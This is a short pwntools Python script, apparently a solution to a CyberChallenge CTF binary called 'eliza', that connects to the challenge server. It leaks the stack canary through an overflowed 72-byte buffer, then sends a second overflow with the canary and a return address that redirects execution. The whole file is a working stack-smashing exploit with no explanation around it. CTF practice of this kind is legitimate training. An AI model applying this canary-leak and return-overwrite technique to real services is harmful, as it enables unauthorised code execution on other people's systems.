from pwn import *
from time import sleep

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/2-eliza/eliza")
context.binary = exe
HOST = "eliza.challs.cyberchallenge.it"
PORT = 6011
p = remote(HOST, PORT)
print("[+] Exploiting...")
p.send('a' * 72 + 'x')
p.recvuntil('Sorry, \"')
line = p.recvline().strip()
x_pos = line.find(b'x')
canary = b'\x00' + line[x_pos + 1:x_pos + 8]
payload = b"\n" * 72 + canary + b"AAAAAAAA" + p64(0x00400897)
p.sendlineafter("Ask me anything...\n", payload)
p.interactive()
